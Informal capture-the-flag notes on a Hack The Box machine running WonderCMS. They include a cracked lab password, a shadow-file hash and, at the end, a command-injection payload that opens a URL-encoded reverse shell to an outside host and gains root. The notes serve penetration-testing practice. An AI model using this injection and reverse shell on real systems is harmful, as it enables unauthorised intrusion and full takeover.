___


*php here*
http://sea.htb/contact.php


there is <!---admin CSS---> comment so there must be some admin page here that i can't see

this is php website, I have a php cookie for my user, also other pages I get forbidden in


fuzzing:
dirs looks like nothing i can access
subdomains also nothing



*found this version for what???*
3.2.0



*wonder CMS bike theme* found it!!!
https://github.com/robiso/bike



"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",


this hash is escaped!!! bc its in json format had to remove the \ chars and the john runs it



*cracked pass*
?:mychemicalromance



*version*
[WonderCMS 3.4.2](https://wondercms.com)


*2 users*
drwxr-xr-x  4 amay amay 4.0K Aug  1  2024 amay
drwxr-x---  4 geo  geo  4.0K Aug  1  2024 geo


*ssh*
user: amay
pass: mychemicalromance

*need to get geo user enum amay as well*



*I get access denied on these*

tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:55733         0.0.0.0:*               LISTEN

google chrome in /opt

*port forward that  + linpeas.sh*


*amay signs in localhost:8080*

# System Monitor(Developing)



===> *55737 is google chrome port* <- pretty sure this is what is clicking on my xss exploit (so i think no the way)

*that other port has this*
200      GET       20l       70w      687c http://localhost:55733/devtools/inspector.html
200      GET       17l       38w      865c http://localhost:55733/json



*can try to connect with chrome dev tools*
*nothing interesting on 8080 though.... and geo....


===> *this is a cron job for crome running daily in the machine*

*lrwxrwxrwx   1 root root   37 Jul 29  2024 google-chrome -> /opt/google/chrome/cron/google-chrome

but like running as root? <- can I escalate privs?



*check ig*
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 amay amay 807 Feb 25  2020 /home/amay/.profile

-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 amay amay 3771 Feb 25  2020 /home/amay/.bashrc




*backups dir what is this /snap/core20*
/snap/core20/2318/var/backups



Binary file /var/log/journal/bc3805e3e6b449d38bd0a698ebf1ae9c/user-1000.journal matches



# System Monitor(Developing)
 *this is prob running as root*


*system monitor running as root I can read any file but only 21 lines bruvs*
#21 lines


*how do i get geo -> can read any file but what file to read???*

system monitor is prob running from root files r there


mychemicalromance



adding +# on the parameter showed me full output uncut; i think comenting out the bash code of whaterver was coming after

+is space


*geo hash*

geo:$6$5mAIqOze4GJ4s9Zu$P3IgUSHlcCkKpDJ0862IgP5aqaNilEUZDGIm16FiWdxh1A5dfKjmwhMgp3xctHiHZVWGtmKY25cCrILanDPaG.:19934:0:99999:7:::


 *payload*
log_file=/etc/shadow+;/bin/bash+-c+"sh%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E23%2F443%200%3E%261";+#&analyze_log=/home/test_log.log


this got root shell


